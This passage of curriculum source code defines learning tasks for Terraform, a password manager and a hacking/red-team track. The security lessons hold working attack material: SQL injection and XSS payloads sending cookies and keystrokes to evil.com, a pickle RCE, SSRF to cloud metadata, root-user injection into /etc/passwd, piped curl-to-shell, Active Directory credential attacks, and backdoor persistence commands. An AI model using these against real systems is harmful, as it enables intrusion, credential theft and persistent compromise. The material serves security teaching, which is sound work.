### Import Command
\`\`\`bash
terraform import aws_instance.web i-1234567890
\`\`\`

### Implementation
\`\`\`go
func Import(resourceType, name, id string, provider Provider) error {
    // Read current state from cloud
    current, err := provider.Read(id)
    if err != nil {
        return fmt.Errorf("resource not found: %s", id)
    }

    // Add to state
    state.Resources[name] = Resource{
        Type: resourceType,
        ID:   id,
        Attributes: current,
    }

    // Generate config suggestion
    fmt.Printf("# Add this to your config:\\n")
    fmt.Printf("resource \\"%s\\" \\"%s\\" {\\n", resourceType, name)
    for k, v := range current {
        fmt.Printf("  %s = %v\\n", k, v)
    }
    fmt.Printf("}\\n")

    return state.Save()
}
\`\`\`

## Completion Criteria
- [ ] Import adds to state
- [ ] Config generated
- [ ] Handles missing resources`],

				['Add remote state', 'Store state in S3/GCS. Locking with DynamoDB.',
`## Remote State Backend

### S3 Backend Config
\`\`\`hcl
terraform {
  backend "s3" {
    bucket         = "my-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    dynamodb_table = "terraform-locks"
    encrypt        = true
  }
}
\`\`\`

### Backend Interface
\`\`\`go
type Backend interface {
    GetState() ([]byte, error)
    PutState(data []byte) error
    Lock() (string, error)
    Unlock(lockID string) error
}

type S3Backend struct {
    bucket string
    key    string
    dynamo *dynamodb.Client
}

func (b *S3Backend) Lock() (string, error) {
    lockID := uuid.New().String()
    _, err := b.dynamo.PutItem(&dynamodb.PutItemInput{
        TableName: "terraform-locks",
        Item: map[string]types.AttributeValue{
            "LockID": &types.AttributeValueMemberS{Value: b.key},
            "Info":   &types.AttributeValueMemberS{Value: lockID},
        },
        ConditionExpression: aws.String("attribute_not_exists(LockID)"),
    })
    return lockID, err
}
\`\`\`

## Completion Criteria
- [ ] Remote storage works
- [ ] Locking prevents conflicts
- [ ] Encryption at rest`],
			]},
		]);
	} else if (path.name.includes('Password Manager')) {
		addTasks(path.id, [
			{ name: 'Cryptography', desc: 'Security foundation', tasks: [
				['Implement key derivation', 'Derive encryption key from master password using Argon2id. Memory-hard, resists GPU attacks.',
`## Key Derivation

### Argon2id
\`\`\`rust
use argon2::{Argon2, Params};

fn derive_key(password: &str, salt: &[u8]) -> [u8; 32] {
    let params = Params::new(
        65536,  // 64 MB memory
        3,      // 3 iterations
        4,      // 4 parallel threads
        Some(32) // 256-bit output
    ).unwrap();

    let argon2 = Argon2::new(Algorithm::Argon2id, Version::V0x13, params);
    let mut key = [0u8; 32];
    argon2.hash_password_into(password.as_bytes(), salt, &mut key).unwrap();
    key
}
\`\`\`

### Salt Generation
\`\`\`rust
fn generate_salt() -> [u8; 16] {
    let mut salt = [0u8; 16];
    OsRng.fill_bytes(&mut salt);
    salt
}
\`\`\`

### Why Argon2id?
- Memory-hard: expensive on GPUs
- Combines Argon2i (side-channel resistant) and Argon2d (faster)
- Winner of Password Hashing Competition

## Completion Criteria
- [ ] Argon2id implemented
- [ ] Random salt generated
- [ ] Secure parameters`],

				['Add encryption', 'AES-256-GCM authenticated encryption. Unique nonce per encryption.',
`## Encryption

### AES-256-GCM
\`\`\`rust
use aes_gcm::{Aes256Gcm, Key, Nonce};

fn encrypt(key: &[u8; 32], plaintext: &[u8]) -> Vec<u8> {
    let cipher = Aes256Gcm::new(Key::from_slice(key));
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher.encrypt(nonce, plaintext).unwrap();

    // Prepend nonce to ciphertext
    let mut result = nonce_bytes.to_vec();
    result.extend(ciphertext);
    result
}

fn decrypt(key: &[u8; 32], data: &[u8]) -> Result<Vec<u8>, Error> {
    let cipher = Aes256Gcm::new(Key::from_slice(key));
    let nonce = Nonce::from_slice(&data[..12]);
    let ciphertext = &data[12..];

    cipher.decrypt(nonce, ciphertext)
        .map_err(|_| Error::DecryptionFailed)
}
\`\`\`

### GCM Benefits
- Authenticated: detects tampering
- Fast: hardware acceleration
- No padding needed

## Completion Criteria
- [ ] Encryption works
- [ ] Unique nonce per encrypt
- [ ] Tampering detected`],

				['Build secure storage', 'Encrypted vault file. Decrypt to memory only when unlocked.',
`## Vault Storage

### File Format
\`\`\`
+----------------+
| Magic (4 bytes)|  "PWMG"
+----------------+
| Version (1)    |
+----------------+
| Salt (16)      |
+----------------+
| Argon2 params  |
+----------------+
| Encrypted data |
|   (AES-GCM)    |
+----------------+
\`\`\`

### Vault Structure
\`\`\`rust
struct Vault {
    entries: HashMap<Uuid, Entry>,
    // Only in memory when unlocked
}

struct Entry {
    id: Uuid,
    title: String,
    username: String,
    password: String,  // Encrypted in storage
    url: Option<String>,
    notes: Option<String>,
    created_at: DateTime,
    modified_at: DateTime,
}
\`\`\`

### Memory Security
\`\`\`rust
// Clear sensitive data from memory
fn secure_zero(data: &mut [u8]) {
    for byte in data.iter_mut() {
        std::ptr::write_volatile(byte, 0);
    }
}
\`\`\`

## Completion Criteria
- [ ] Vault encrypts on save
- [ ] Memory cleared on lock
- [ ] File format defined`],

				['Implement master password', 'Single password unlocks vault. Lock after timeout.',
`## Master Password

### Verification
\`\`\`rust
impl Vault {
    fn unlock(&mut self, password: &str) -> Result<(), Error> {
        let key = derive_key(password, &self.salt);

        // Try to decrypt verification block
        let verified = decrypt(&key, &self.verification_block)
            .map(|data| data == VERIFICATION_MAGIC)
            .unwrap_or(false);

        if !verified {
            return Err(Error::WrongPassword);
        }

        self.key = Some(key);
        self.last_activity = Instant::now();
        Ok(())
    }

    fn lock(&mut self) {
        if let Some(ref mut key) = self.key {
            secure_zero(key);
        }
        self.key = None;
    }
}
\`\`\`

### Auto-Lock Timeout
\`\`\`rust
const LOCK_TIMEOUT: Duration = Duration::from_secs(300); // 5 minutes

fn check_timeout(&mut self) {
    if self.is_unlocked() {
        if self.last_activity.elapsed() > LOCK_TIMEOUT {
            self.lock();
        }
    }
}
\`\`\`

## Completion Criteria
- [ ] Unlock with password
- [ ] Lock clears key
- [ ] Timeout auto-locks`],

				['Add password generation', 'Cryptographically random. Configurable length and character sets.',
`## Password Generation

### Generator
\`\`\`rust
fn generate_password(length: usize, options: &PasswordOptions) -> String {
    let mut chars = Vec::new();

    if options.lowercase { chars.extend('a'..='z'); }
    if options.uppercase { chars.extend('A'..='Z'); }
    if options.digits { chars.extend('0'..='9'); }
    if options.symbols { chars.extend("!@#$%^&*()".chars()); }

    let mut password = String::with_capacity(length);
    for _ in 0..length {
        let idx = OsRng.gen_range(0..chars.len());
        password.push(chars[idx]);
    }

    // Ensure at least one of each required type
    if !meets_requirements(&password, options) {
        return generate_password(length, options);
    }

    password
}
\`\`\`

### Passphrase Generation
\`\`\`rust
fn generate_passphrase(words: usize, separator: char) -> String {
    let wordlist = include_str!("wordlist.txt").lines().collect::<Vec<_>>();
    let mut phrase = Vec::with_capacity(words);

    for _ in 0..words {
        let idx = OsRng.gen_range(0..wordlist.len());
        phrase.push(wordlist[idx]);
    }

    phrase.join(&separator.to_string())
}
// "correct-horse-battery-staple"
\`\`\`

## Completion Criteria
- [ ] Cryptographically random
- [ ] Configurable options
- [ ] Passphrase option`],
			]},
			{ name: 'User Interface', desc: 'Usability', tasks: [
				['Build CLI interface', 'Commands: init, unlock, add, get, list. Secure password prompts.',
`## CLI Commands

### Command Structure
\`\`\`rust
enum Command {
    Init,
    Unlock,
    Lock,
    Add { title: String },
    Get { query: String },
    List,
    Delete { id: String },
    Generate { length: usize },
}
\`\`\`

### Secure Password Prompt
\`\`\`rust
fn prompt_password(prompt: &str) -> String {
    print!("{}", prompt);
    io::stdout().flush().unwrap();

    // Disable echo
    let mut termios = termios::Termios::from_fd(0).unwrap();
    termios.c_lflag &= !termios::ECHO;
    termios::tcsetattr(0, termios::TCSANOW, &termios).unwrap();

    let mut password = String::new();
    io::stdin().read_line(&mut password).unwrap();

    // Re-enable echo
    termios.c_lflag |= termios::ECHO;
    termios::tcsetattr(0, termios::TCSANOW, &termios).unwrap();

    println!();
    password.trim().to_string()
}
\`\`\`

### Example Usage
\`\`\`bash
pwm init
pwm unlock
pwm add "GitHub"
pwm get github
pwm list
\`\`\`

## Completion Criteria
- [ ] All commands work
- [ ] Password not echoed
- [ ] Tab completion`],

				['Add search and filter', 'Search by title, username, URL. Fuzzy matching.',
`## Search

### Fuzzy Matching
\`\`\`rust
fn fuzzy_match(query: &str, target: &str) -> bool {
    let query = query.to_lowercase();
    let target = target.to_lowercase();

    let mut query_chars = query.chars().peekable();

    for c in target.chars() {
        if query_chars.peek() == Some(&c) {
            query_chars.next();
        }
    }

    query_chars.peek().is_none()
}

// "gh" matches "GitHub"
// "gthb" matches "GitHub"
\`\`\`

### Search Implementation
\`\`\`rust
fn search(&self, query: &str) -> Vec<&Entry> {
    self.entries.values()
        .filter(|e| {
            fuzzy_match(query, &e.title) ||
            fuzzy_match(query, &e.username) ||
            e.url.as_ref().map(|u| fuzzy_match(query, u)).unwrap_or(false)
        })
        .collect()
}
\`\`\`

## Completion Criteria
- [ ] Search works
- [ ] Fuzzy matching
- [ ] Multiple fields`],

				['Implement clipboard integration', 'Copy password. Auto-clear after timeout.',
`## Clipboard

### Copy to Clipboard
\`\`\`rust
fn copy_to_clipboard(text: &str) -> Result<(), Error> {
    #[cfg(target_os = "macos")]
    {
        Command::new("pbcopy")
            .stdin(Stdio::piped())
            .spawn()?
            .stdin.unwrap()
            .write_all(text.as_bytes())?;
    }

    #[cfg(target_os = "linux")]
    {
        Command::new("xclip")
            .args(["-selection", "clipboard"])
            .stdin(Stdio::piped())
            .spawn()?
            .stdin.unwrap()
            .write_all(text.as_bytes())?;
    }

    Ok(())
}
\`\`\`

### Auto-Clear
\`\`\`rust
fn copy_with_clear(text: &str, timeout: Duration) {
    copy_to_clipboard(text).unwrap();
    println!("Password copied. Clearing in {} seconds.", timeout.as_secs());

    thread::spawn(move || {
        thread::sleep(timeout);
        copy_to_clipboard("").unwrap();
        println!("Clipboard cleared.");
    });
}
\`\`\`

## Completion Criteria
- [ ] Copy works cross-platform
- [ ] Auto-clear after timeout
- [ ] User notified`],

				['Add import/export', 'Import from CSV, other managers. Export backup.',
`## Import/Export

### CSV Import
\`\`\`rust
fn import_csv(path: &str) -> Result<Vec<Entry>, Error> {
    let mut reader = csv::Reader::from_path(path)?;
    let mut entries = Vec::new();

    for result in reader.deserialize() {
        let record: CsvRecord = result?;
        entries.push(Entry {
            id: Uuid::new_v4(),
            title: record.title,
            username: record.username,
            password: record.password,
            url: record.url,
            notes: record.notes,
            created_at: Utc::now(),
            modified_at: Utc::now(),
        });
    }
    Ok(entries)
}
\`\`\`

### Encrypted Export
\`\`\`rust
fn export_encrypted(&self, path: &str, password: &str) -> Result<(), Error> {
    let data = serde_json::to_vec(&self.entries)?;
    let salt = generate_salt();
    let key = derive_key(password, &salt);
    let encrypted = encrypt(&key, &data);

    let mut file = File::create(path)?;
    file.write_all(&salt)?;
    file.write_all(&encrypted)?;
    Ok(())
}
\`\`\`

## Completion Criteria
- [ ] CSV import
- [ ] Encrypted export
- [ ] Format compatibility`],

				['Build browser extension', 'Detect login forms. Auto-fill credentials. Native messaging.',
`## Browser Extension

### Content Script (Detect Forms)
\`\`\`javascript
function findLoginForms() {
    const forms = document.querySelectorAll('form');
    return Array.from(forms).filter(form => {
        const inputs = form.querySelectorAll('input');
        const hasPassword = Array.from(inputs).some(
            i => i.type === 'password'
        );
        const hasUsername = Array.from(inputs).some(
            i => i.type === 'text' || i.type === 'email'
        );
        return hasPassword && hasUsername;
    });
}
\`\`\`

### Native Messaging
\`\`\`javascript
// Connect to native app
const port = browser.runtime.connectNative("passwordmanager");

port.postMessage({
    action: "get",
    url: window.location.origin
});

port.onMessage.addListener(response => {
    if (response.credentials) {
        fillForm(response.credentials);
    }
});
\`\`\`

### Auto-Fill
\`\`\`javascript
function fillForm(credentials) {
    const form = findLoginForms()[0];
    const inputs = form.querySelectorAll('input');

    inputs.forEach(input => {
        if (input.type === 'password') {
            input.value = credentials.password;
        } else if (input.type === 'text' || input.type === 'email') {
            input.value = credentials.username;
        }
    });
}
\`\`\`

## Completion Criteria
- [ ] Form detection
- [ ] Native messaging
- [ ] Auto-fill works`],
			]},
		]);
	} else if (path.name.includes('Hacking') || path.name.includes('Security') || path.name.includes('Red Team') || path.name.includes('CTF')) {
		addTasks(path.id, [
			{ name: 'Reconnaissance', desc: 'Information gathering', tasks: [
				['Learn network scanning', 'Nmap: -sn (host discovery), -sS (SYN scan), -sV (version detection). Identify open ports, running services, OS fingerprinting. Scan ranges: nmap 192.168.1.0/24.',
`## Network Scanning with Nmap

### Host Discovery
\`\`\`bash
# Ping sweep - find live hosts
nmap -sn 192.168.1.0/24

# ARP scan (local network, more reliable)
nmap -PR 192.168.1.0/24

# Skip host discovery (scan even if ping fails)
nmap -Pn 10.10.10.5
\`\`\`

### Port Scanning
\`\`\`bash
# SYN scan (stealth, requires root)
sudo nmap -sS 10.10.10.5

# Connect scan (no root required)
nmap -sT 10.10.10.5

# UDP scan (slow but important)
sudo nmap -sU --top-ports 100 10.10.10.5

# Full port scan
nmap -p- 10.10.10.5

# Specific ports
nmap -p 22,80,443,8080 10.10.10.5
\`\`\`

### Service & OS Detection
\`\`\`bash
# Version detection
nmap -sV 10.10.10.5

# OS fingerprinting
sudo nmap -O 10.10.10.5

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 10.10.10.5

# NSE scripts for vulnerability detection
nmap --script=vuln 10.10.10.5
\`\`\`

### Output Formats
\`\`\`bash
# Save all formats
nmap -oA scan_results 10.10.10.5

# XML for parsing
nmap -oX scan.xml 10.10.10.5

# Grepable format
nmap -oG scan.gnmap 10.10.10.5
\`\`\`

## Completion Criteria
- [ ] Discover live hosts on a network
- [ ] Identify open ports and services
- [ ] Perform OS fingerprinting
- [ ] Save and parse scan results`],

				['Understand enumeration', 'Extract details from services: SMB shares (smbclient -L), SNMP (snmpwalk), DNS zone transfers (dig axfr), LDAP queries. Banner grabbing for versions.',
`## Service Enumeration

### SMB Enumeration
\`\`\`bash
# List shares (null session)
smbclient -L //10.10.10.5 -N

# Connect to share
smbclient //10.10.10.5/share -U user%password

# Enumerate with enum4linux
enum4linux -a 10.10.10.5

# CrackMapExec
crackmapexec smb 10.10.10.5 --shares
crackmapexec smb 10.10.10.5 -u '' -p '' --users
\`\`\`

### DNS Enumeration
\`\`\`bash
# Zone transfer attempt
dig axfr @10.10.10.5 domain.local

# DNS queries
dig any domain.local @10.10.10.5
host -t mx domain.local 10.10.10.5

# Subdomain brute force
dnsenum domain.local
\`\`\`

### SNMP Enumeration
\`\`\`bash
# SNMPwalk with community string
snmpwalk -v2c -c public 10.10.10.5

# Specific OIDs
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.1  # System info
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.4.1.77.1.2.25  # Users (Windows)

# Brute force community strings
onesixtyone -c wordlist.txt 10.10.10.5
\`\`\`

### LDAP Enumeration
\`\`\`bash
# Anonymous bind
ldapsearch -x -H ldap://10.10.10.5 -b "DC=domain,DC=local"

# Get naming contexts
ldapsearch -x -H ldap://10.10.10.5 -s base namingContexts

# Extract users
ldapsearch -x -H ldap://10.10.10.5 -b "DC=domain,DC=local" "(objectClass=user)"
\`\`\`

### Banner Grabbing
\`\`\`bash
# Netcat
nc -nv 10.10.10.5 22

# Telnet
telnet 10.10.10.5 80

# Curl for HTTP headers
curl -I http://10.10.10.5
\`\`\`

## Completion Criteria
- [ ] Enumerate SMB shares and users
- [ ] Attempt DNS zone transfers
- [ ] Extract SNMP information
- [ ] Query LDAP for domain info`],

				['Practice OSINT', 'theHarvester for emails, subdomains. Shodan for internet-connected devices. LinkedIn for employee info. GitHub for leaked credentials, API keys in code.',
`## Open Source Intelligence (OSINT)

### Email & Domain Discovery
\`\`\`bash
# theHarvester - emails, subdomains, hosts
theHarvester -d target.com -b google,bing,linkedin

# Sublist3r for subdomains
sublist3r -d target.com

# Amass for comprehensive enumeration
amass enum -d target.com
\`\`\`

### Shodan
\`\`\`bash
# Search for organization
shodan search "org:Target Company"

# Find specific services
shodan search "hostname:target.com port:22"

# Get host info
shodan host 1.2.3.4

# Facet analysis
shodan stats --facets port country:10 "org:Target"
\`\`\`

### Code & Secrets Search
\`\`\`bash
# GitHub search operators
# org:targetcompany password
# org:targetcompany api_key
# org:targetcompany aws_secret

# Trufflehog for secrets in repos
trufflehog git https://github.com/target/repo

# Gitleaks
gitleaks detect -s /path/to/repo

# Search engines
# site:github.com "target.com" password
# site:pastebin.com "target.com"
\`\`\`

### Social Media & People
\`\`\`
LinkedIn:
- Employee names, titles, departments
- Technologies mentioned in job postings
- Email format from profiles

Tools:
- linkedin2username - generate usernames
- CrossLinked - enumerate employees
- hunter.io - email format discovery
\`\`\`

### Google Dorks
\`\`\`
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak | ext:log
site:pastebin.com "target.com"
\`\`\`

## Completion Criteria
- [ ] Gather emails and subdomains
- [ ] Search Shodan for exposed assets
- [ ] Find leaked credentials/keys in code
- [ ] Build employee list from LinkedIn`],

				['Study web recon', 'Subdomain enum: subfinder, amass. Directory brute: gobuster, feroxbuster. Tech detection: wappalyzer, whatweb. Check robots.txt, .git exposure, backup files.',
`## Web Reconnaissance

### Subdomain Enumeration
\`\`\`bash
# Subfinder (passive)
subfinder -d target.com -o subs.txt

# Amass (passive + active)
amass enum -passive -d target.com
amass enum -active -d target.com -brute

# DNS brute force
gobuster dns -d target.com -w subdomains.txt

# Verify with httpx
cat subs.txt | httpx -ports 80,443,8080,8443 -o live.txt
\`\`\`

### Directory & File Discovery
\`\`\`bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Feroxbuster (recursive, fast)
feroxbuster -u http://target.com -w wordlist.txt

# With extensions
gobuster dir -u http://target.com -w wordlist.txt -x php,txt,bak,old

# FFUF (fuzzing)
ffuf -u http://target.com/FUZZ -w wordlist.txt
\`\`\`

### Technology Detection
\`\`\`bash
# WhatWeb
whatweb http://target.com

# Wappalyzer (browser extension or CLI)
wappalyzer http://target.com

# Nuclei for tech detection
nuclei -u http://target.com -t technologies/
\`\`\`

### Common Exposures
\`\`\`bash
# Check robots.txt, sitemap
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml

# Git exposure
curl http://target.com/.git/config
# If exposed: git-dumper http://target.com/.git/ output/

# Backup files
curl http://target.com/index.php.bak
curl http://target.com/backup.zip

# Environment/config files
curl http://target.com/.env
curl http://target.com/config.php.bak
\`\`\`

### JavaScript Analysis
\`\`\`bash
# Find JS files
gau target.com | grep -E "\\.js$"

# Extract endpoints from JS
cat main.js | grep -oE '"/(api/[^"]+)"'

# LinkFinder for endpoints
linkfinder -i http://target.com/main.js -o cli
\`\`\`

## Completion Criteria
- [ ] Enumerate all subdomains
- [ ] Brute force directories
- [ ] Identify technologies in use
- [ ] Check for exposed files/configs`],

				['Build target profile', 'Compile: IP ranges, subdomains, technologies, employees, email format, exposed services. Identify attack surface. Prioritize targets by likelihood of success.',
`## Target Profile Documentation

### Information Categories
\`\`\`markdown
# Target: Company Name

## Network Infrastructure
- IP Ranges: 10.10.10.0/24, 192.168.1.0/24
- External IPs: 1.2.3.4, 1.2.3.5
- Cloud: AWS (confirmed via headers), Azure (DNS records)

## Domains & Subdomains
- Primary: target.com
- Subdomains:
  - www.target.com (10.10.10.1) - Main website
  - api.target.com (10.10.10.2) - REST API
  - dev.target.com (10.10.10.3) - Development (interesting!)
  - vpn.target.com (10.10.10.4) - VPN endpoint

## Technologies
| Component | Technology | Version |
|-----------|------------|---------|
| Web Server | nginx | 1.18.0 |
| Framework | Django | 3.2 |
| Database | PostgreSQL | likely |
| CDN | CloudFlare | - |

## Services
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2 | Key only |
| 80 | HTTP | nginx/1.18.0 | Redirects to 443 |
| 443 | HTTPS | nginx/1.18.0 | Main site |
| 8080 | HTTP | Tomcat | Admin panel |

## People & Emails
- Email format: first.last@target.com
- Key personnel:
  - John Smith (CTO) - john.smith@target.com
  - Jane Doe (SysAdmin) - jane.doe@target.com
- Total employees: ~50 (from LinkedIn)

## Attack Surface Priority
1. dev.target.com - Likely weaker security
2. Port 8080 Tomcat - Admin interface
3. VPN endpoint - Potential credential stuffing
4. API endpoints - Test for IDOR, injection
\`\`\`

### Visualization
\`\`\`
                    [Internet]
                         |
                   [CloudFlare]
                         |
            +-----------+------------+
            |           |            |
         [www]       [api]        [dev]
         nginx       nginx        nginx
            |           |            |
       [Django App] [REST API]  [Dev App]
            |           |            |
         [PostgreSQL Database]
\`\`\`

### Prioritization Matrix
\`\`\`
High Value + Easy: Priority 1 (dev server, exposed admin)
High Value + Hard: Priority 2 (main app, requires auth bypass)
Low Value + Easy: Priority 3 (static sites)
Low Value + Hard: Deprioritize
\`\`\`

## Completion Criteria
- [ ] Document all discovered assets
- [ ] Map network architecture
- [ ] List technologies and versions
- [ ] Prioritize attack vectors`],
			]},
			{ name: 'Exploitation', desc: 'Attack techniques', tasks: [
				['Learn common vulnerabilities', 'OWASP Top 10: injection, broken auth, XSS, insecure deserialization, SSRF. Understand root cause, impact, and remediation for each.',
`## OWASP Top 10 Vulnerabilities

### Injection (SQLi, Command)
\`\`\`sql
-- SQL Injection
' OR '1'='1' --
' UNION SELECT username, password FROM users --
'; DROP TABLE users; --

-- Blind SQLi (time-based)
' AND SLEEP(5) --
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
\`\`\`

\`\`\`bash
# Command injection
; cat /etc/passwd
| whoami
\`$(whoami)\`
\`\`\`

### Broken Authentication
\`\`\`
- Credential stuffing (reused passwords)
- Weak password policy
- Session fixation
- JWT vulnerabilities (none algorithm, weak secret)
- Password reset flaws
\`\`\`

### Cross-Site Scripting (XSS)
\`\`\`javascript
// Reflected XSS
<script>alert(document.cookie)</script>

// Stored XSS
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

// DOM-based XSS
<script>document.write(location.hash.slice(1))</script>
\`\`\`

### Insecure Deserialization
\`\`\`python
# Python pickle RCE
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
\`\`\`

### SSRF (Server-Side Request Forgery)
\`\`\`
# Access internal services
http://localhost:6379/  # Redis
http://169.254.169.254/latest/meta-data/  # AWS metadata
http://internal-api.local/admin

# Bypass filters
http://127.0.0.1 → http://127.1 → http://0
http://[::1]/ (IPv6 localhost)
\`\`\`

## Completion Criteria
- [ ] Identify each vulnerability type
- [ ] Understand root cause
- [ ] Know impact and exploitation
- [ ] Understand remediation`],

				['Practice privilege escalation', 'Linux: SUID binaries, sudo misconfig, cron jobs, kernel exploits. Windows: service misconfig, unquoted paths, token impersonation (Potato), AlwaysInstallElevated.',
`## Privilege Escalation

### Linux Privilege Escalation
\`\`\`bash
# Enumeration
id; whoami; hostname
uname -a  # Kernel version
cat /etc/os-release

# SUID binaries
find / -perm -4000 2>/dev/null
# Check GTFOBins for exploitation

# Sudo misconfigurations
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c '!sh'

# Writable cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
# Find scripts you can modify

# Writable /etc/passwd
echo 'root2:$(openssl passwd pass):0:0::/root:/bin/bash' >> /etc/passwd

# Capabilities
getcap -r / 2>/dev/null
# /usr/bin/python3 = cap_setuid+ep → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Automated: LinPEAS
curl https://linpeas.sh | sh
\`\`\`

### Windows Privilege Escalation
\`\`\`powershell
# Enumeration
whoami /priv
whoami /groups
systeminfo

# Service misconfigurations
# Unquoted service paths
wmic service get name,pathname | findstr /i "Program Files"
# C:\\Program Files\\My App\\service.exe
# Place: C:\\Program.exe

# Weak service permissions
accesschk.exe -wuvc "servicename"
sc config servicename binpath= "C:\\shell.exe"

# AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# If enabled: msiexec /i malicious.msi

# Token Impersonation (SeImpersonatePrivilege)
# PrintSpoofer, GodPotato, JuicyPotato

# Automated: WinPEAS
winpeas.exe
\`\`\`

### Tools
\`\`\`
Linux: LinPEAS, LinEnum, linux-exploit-suggester
Windows: WinPEAS, PowerUp, Seatbelt, SharpUp
\`\`\`

## Completion Criteria
- [ ] Enumerate Linux privesc vectors
- [ ] Enumerate Windows privesc vectors
- [ ] Exploit SUID or sudo misconfig
- [ ] Exploit a Windows service`],

				['Understand Active Directory attacks', 'Kerberoasting, AS-REP roasting, pass-the-hash, DCSync, golden/silver tickets, delegation abuse, NTLM relay. BloodHound for attack path mapping.',
`## Active Directory Attacks

### Kerberoasting
\`\`\`powershell
# Request service tickets for SPNs
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.5 -request

# Crack offline
hashcat -m 13100 hashes.txt wordlist.txt

# Defense: Strong SPN passwords, AES encryption
\`\`\`

### AS-REP Roasting
\`\`\`bash
# Find users without pre-auth
GetNPUsers.py domain.local/ -dc-ip 10.10.10.5 -usersfile users.txt -no-pass

# Crack offline
hashcat -m 18200 hashes.txt wordlist.txt
\`\`\`

### Pass-the-Hash
\`\`\`bash
# Use NTLM hash instead of password
crackmapexec smb 10.10.10.5 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash

psexec.py domain/admin@10.10.10.5 -hashes :hash
wmiexec.py domain/admin@10.10.10.5 -hashes :hash
\`\`\`

### DCSync
\`\`\`bash
# Requires: Replicating Directory Changes permissions
secretsdump.py domain/admin:password@10.10.10.5

# Get specific user
secretsdump.py -just-dc-user krbtgt domain/admin:password@10.10.10.5
\`\`\`

### Golden Ticket
\`\`\`powershell
# Need: krbtgt hash, domain SID
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Now have domain admin access forever (until krbtgt rotated 2x)
\`\`\`

### NTLM Relay
\`\`\`bash
# Relay captured NTLM auth to another machine
ntlmrelayx.py -t smb://10.10.10.6 -smb2support

# Trigger auth with Responder or PetitPotam
responder -I eth0
\`\`\`

### BloodHound
\`\`\`bash
# Collect data
bloodhound-python -u user -p password -d domain.local -c All

# Import to BloodHound, find paths:
# - Shortest path to Domain Admin
# - Users with DCSync rights
# - Kerberoastable users
\`\`\`

## Completion Criteria
- [ ] Perform Kerberoasting
- [ ] Execute Pass-the-Hash
- [ ] Map attack paths with BloodHound
- [ ] Understand Golden Ticket impact`],

				['Study web exploitation', 'XSS: steal cookies, keylog. SQLi: union-based extraction, blind time-based. SSRF: access internal services, cloud metadata. Chaining vulns for impact.',
`## Web Exploitation Techniques

### SQL Injection Deep Dive
\`\`\`sql
-- Find injection point
' OR '1'='1
' AND '1'='2

-- Determine column count
' ORDER BY 1 --
' ORDER BY 2 --
' UNION SELECT NULL, NULL, NULL --

-- Extract data
' UNION SELECT username, password, NULL FROM users --
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --

-- Blind SQLi (boolean)
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --

-- Blind SQLi (time-based)
' AND IF(1=1, SLEEP(5), 0) --
' AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0) --

-- Out-of-band
' UNION SELECT load_file('/etc/passwd') --
' INTO OUTFILE '/var/www/html/shell.php' --
\`\`\`

### XSS Exploitation
\`\`\`javascript
// Cookie theft
<script>
fetch('https://evil.com/steal?c='+document.cookie)
</script>

// Keylogger
<script>
document.onkeypress = function(e) {
  fetch('https://evil.com/log?k='+e.key)
}
</script>

// Session hijacking
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin/users', true);
xhr.onload = function() {
  fetch('https://evil.com/data', {method:'POST', body:xhr.responseText})
};
xhr.send();
</script>

// Filter bypasses
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
javascript:alert(1)
\`\`\`

### SSRF Exploitation
\`\`\`
# Internal service access
http://localhost:6379/INFO  # Redis
http://localhost:9200/_cat/indices  # Elasticsearch
http://127.0.0.1:8080/manager/html  # Tomcat

# Cloud metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
http://metadata.google.internal/computeMetadata/v1/  # GCP

# Protocol smuggling
gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
\`\`\`

### Chaining Vulnerabilities
\`\`\`
Example chain:
1. SSRF → Access internal API
2. API returns admin credentials
3. Login as admin
4. File upload → RCE

Another chain:
1. XSS → Steal admin session
2. As admin → Change user email
3. Password reset → Account takeover
\`\`\`

## Completion Criteria
- [ ] Extract data with SQLi
- [ ] Steal cookies with XSS
- [ ] Access internal services via SSRF
- [ ] Chain vulnerabilities for impact`],

				['Practice post-exploitation', 'Persistence: scheduled tasks, registry, services. Credential harvesting: mimikatz, browser passwords. Pivoting: SSH tunnels, chisel, SOCKS proxy to internal network.',
`## Post-Exploitation

### Persistence (Windows)
\`\`\`powershell
# Scheduled Task
schtasks /create /tn "Updater" /tr "C:\\shell.exe" /sc onlogon /ru SYSTEM

# Registry Run Key
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\shell.exe"

# New Service
sc create backdoor binPath= "C:\\shell.exe" start= auto
sc start backdoor

# WMI Event Subscription
# Triggers on specific events (login, time, etc.)
\`\`\`

### Persistence (Linux)
\`\`\`bash
# Cron job
echo "* * * * * /tmp/shell.sh" | crontab -

# SSH key
echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys

# Bashrc
